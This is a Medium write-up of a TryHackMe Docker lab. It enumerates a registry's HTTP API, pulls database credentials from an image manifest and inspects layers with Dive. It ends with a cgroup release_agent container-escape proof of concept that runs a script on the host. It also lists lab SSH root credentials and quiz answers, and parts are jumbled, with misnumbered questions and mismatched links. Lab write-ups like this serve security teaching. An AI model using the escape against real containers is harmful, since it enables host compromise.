---
title: "The Docker Rodeo TryHackme Writeup 3fc9a848e695"
platform: Medium
original_file: 2024-09-04_The-Docker-Rodeo-TryHackme-Writeup-3fc9a848e695.md
---

# The Docker Rodeo TryHackme Writeup 3fc9a848e695

::: {}
# The Docker Rodeo TryHackme Writeup {#the-docker-rodeo-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
https://tryhackme.com/room/dockerrodeo
:::

::::::: {.section .e-content field="body"}
:::::: {#85d8 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### The Docker Rodeo TryHackme Writeup {#416e .graf .graf--h3 .graf--leading .graf--title name="416e"}

<figure id="9294" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*N_06WpzJp3TXdzvB.png"
class="graf-image" data-image-id="0*N_06WpzJp3TXdzvB.png"
data-width="705" data-height="226" data-is-featured="true" />
</figure>

**Room link**:
[https://tryhackme.com/room/dockerrodeo](https://tryhackme.com/room/dockerrodeo){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/dockerrodeo"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note**: **This room is for Premium Members Only. who purchased THM
premium membership.**

### Task 5. Interacting with a Docker Registry {#ae46 .graf .graf--h3 .graf-after--p name="ae46"}

**Question 1**. What is the port number of the 2nd Docker registry?

[https://tryhackme.com](https://tryhackme.com/){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/"
rel="noopener ugc nofollow noopener" target="_blank"}

> ***Answer: 7000***

**Question 2.** What is the name of the repository within this registry?

We need to send a GET request to
[http://docker-rodeo.thm:7000/v2/\_catalog](http://docker-rodeo.thm:5000/v2/_catalog){.markup--anchor
.markup--p-anchor data-href="http://docker-rodeo.thm:5000/v2/_catalog"
rel="noopener ugc nofollow noopener" target="_blank"} to list all the
repositories registered on the registry.

[https://tryhackme.com](https://tryhackme.com/){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/"
rel="noopener ugc nofollow noopener" target="_blank"}

> ***Answer: securesolutions/webserver***

**Question 3.** What is the name of the tag that has been published?

Before we can begin analysing a repository, we need two key pieces of
information:\
1. The repository name\
2. Any repository tag(s) published

We currently have the repository name (securesolutions/webserver) now we
just need to list all tags that have been published. Every repository
will have a minimum of one tag. This tag is the "latest" tag, but there
can be many tags, all with different code, for example, major software
versions or two tags for "production" and "development".

Send a GET request to
[http://docker-rodeo.thm:7000/v2/repository/name/tags/list](http://docker-rodeo.thm:5000/v2/repository/name/tags/list){.markup--anchor
.markup--p-anchor
data-href="http://docker-rodeo.thm:5000/v2/repository/name/tags/list"
rel="noopener ugc nofollow noopener" target="_blank"} to query all
published tags. For our application, our request would look like so:
[http://docker-rodeo.thm:7000/v2/](http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list){.markup--anchor
.markup--p-anchor
data-href="http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list"
rel="noopener ugc nofollow noopener"
target="_blank"}securesolutions/webserver[/tags/list](http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list){.markup--anchor
.markup--p-anchor
data-href="http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list"
rel="noopener ugc nofollow noopener" target="_blank"}

[https://tryhackme.com](https://tryhackme.com/){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/"
rel="noopener ugc nofollow noopener" target="_blank"}

> ***Answer: production***

**Question 4.** What is the Username in the database configuration?

With these two important pieces of information about a repository known,
we can enumerate that specific repository for a manifest file. This
manifest file contains various pieces of information about the
application, such as size, layers and other information. I'm going to
grab the manifest file for the "notsecure" tag via the following GET
request:
[http://docker-rodeo.thm:7000/v2/securesolutions/webserver/manifests/production](http://docker-rodeo.thm:7000/v2/securesolutions/webserver/manifests/production){.markup--anchor
.markup--p-anchor
data-href="http://docker-rodeo.thm:7000/v2/securesolutions/webserver/manifests/production"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="5546" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*-T_-ir9C8O9EXvAy.png"
class="graf-image" data-image-id="0*-T_-ir9C8O9EXvAy.png"
data-width="832" data-height="347" />
</figure>

[https://tryhackme.com](https://tryhackme.com/){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/"
rel="noopener ugc nofollow noopener" target="_blank"}

> ***Answer: Admin***

**Question 5.** What is the Password in the database configuration?

> ***Answer:production_admin***

### Task 6. Vulnerability #2: Reverse Engineering Docker Images {#1920 .graf .graf--h3 .graf-after--blockquote name="1920"}

Install [Dive
Tool](https://github.com/wagoodman/dive#installation){.markup--anchor
.markup--p-anchor
data-href="https://github.com/wagoodman/dive#installation"
rel="noopener ugc nofollow noopener" target="_blank"}

``` {#572c .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="shell"}
#wget https://github.com/wagoodman/dive/releases/download/v0.9.2/dive_0.9.2_linux_amd64.deb#sudo apt install ./dive_0.9.2_linux_amd64.deb
```

**Challenge**\
Pull the challenge image using **docker pull
docker-rodeo.thm:5000/dive/challenge** and apply what we have done above
for the questions below.

Remember! You will need to use **docker images** to get the
"**IMAGE_ID**" for the new image and use that with the **dive** command.

**Question 1**. What is the "**IMAGE_ID**" for the "**challenge**"
Docker image that you just downloaded?

[https://tryhackme.com](https://tryhackme.com/){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/"
rel="noopener ugc nofollow noopener" target="_blank"}

> ***Answer: 2a0a63ea5d88***

**Question 2.** Using Dive, how many "Layers" are there in this image?

[https://tryhackme.com](https://tryhackme.com/){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="45b5" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*JjiAa6POTmlbAEWp.png"
class="graf-image" data-image-id="0*JjiAa6POTmlbAEWp.png"
data-width="482" data-height="236" />
</figure>

[https://tryhackme.com](https://tryhackme.com/){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/"
rel="noopener ugc nofollow noopener" target="_blank"}

> ***Answer: 7***

**Question 2.** What user is successfully added?

[https://tryhackme.com](https://tryhackme.com/){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/"
rel="noopener ugc nofollow noopener" target="_blank"}

> ***Answer: uogctf***

### Task 11. Vulnerability #7: Misconfigured Privileges (Deploy #2) {#7315 .graf .graf--h3 .graf-after--blockquote name="7315"}

Connect to your new Instance using SSH with the following details:

New Instance IP: 10.10.22.173\
SSH Port: 2244\
Username: root\
Password: danny

he code snippet below is based upon (but a modified) version of the
[Proof of Concept (PoC) created by
Trailofbits](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.){.markup--anchor
.markup--p-anchor
data-href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so."
rel="noopener ugc nofollow noopener" target="_blank"} where they detail
the inner-workings to this exploit well.

``` {#9fb4 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
1. mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x2. echo 1 > /tmp/cgrp/x/notify_on_release3. host_path=`sed -n ‘s/.*\perdir=\([^,]*\).*/\1/p’ /etc/mtab`4. echo “$host_path/exploit” > /tmp/cgrp/release_agent5. echo ‘#!/bin/sh’ > /exploit6. echo “cat /home/cmnatic/flag.txt > $host_path/flag.txt” >> /exploit7. chmod a+x /exploit8. sh -c “echo \$\$ > /tmp/cgrp/x/cgroup.procs”
```

**Let's briefly summarise what happens here:**

- [We need to create a group to use the Linux kernel to write and
  execute our exploit. The kernel uses "cgroups" to manage processes on
  the operating system since we have capabilities to manage "cgroups" as
  root on the host, we'll mount this to "/tmp/cgrp" on the
  container.]{#4108}
- [For our exploit to execute, we'll need to tell Kernel to run our
  code. By adding "1" to "/tmp/cgrp/x/notify_on_release", we're telling
  the kernel to execute something once the "cgroup" finishes. [(Paul
  Menage.,
  2004)](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt){.markup--anchor
  .markup--li-anchor
  data-href="https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt"
  rel="noopener ugc nofollow noopener" target="_blank"}]{#7c1b}
- [We find out where the containers files are stored on the host and
  store it as a variable]{#d752}
- [Where we then echo the location of the containers files into our
  "/exploit" and then ultimately to the "release_agent" which is what
  will be executed by the "cgroup" once it is released.]{#00a9}
- [Let's turn our exploit into a shell on the host]{#3280}
- [Execute a command to echo the host flag into a file named "flag.txt"
  in the container, once "/exploit" is executed]{#551f}
- [Make our exploit executable!]{#34b2}
- [We create a process and store that into
  "/tmp/cgrp/x/cgroup.procs"]{#d2e8}

<figure id="afe2" class="graf graf--figure graf-after--li">
<img
src="https://cdn-images-1.medium.com/max/800/0*dpZ9or_SwF3ZQdLn.png"
class="graf-image" data-image-id="0*dpZ9or_SwF3ZQdLn.png"
data-width="690" data-height="234" />
</figure>

### Promote and Collaborate on Cybersecurity Insights {#0784 .graf .graf--h3 .graf-after--figure name="0784"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#ad58 .graf .graf--h3 .graf-after--p name="ad58"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [September 4, 2024](https://medium.com/p/3fc9a848e695).

[Canonical
link](https://medium.com/@bevijaygupta/the-docker-rodeo-tryhackme-writeup-3fc9a848e695){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
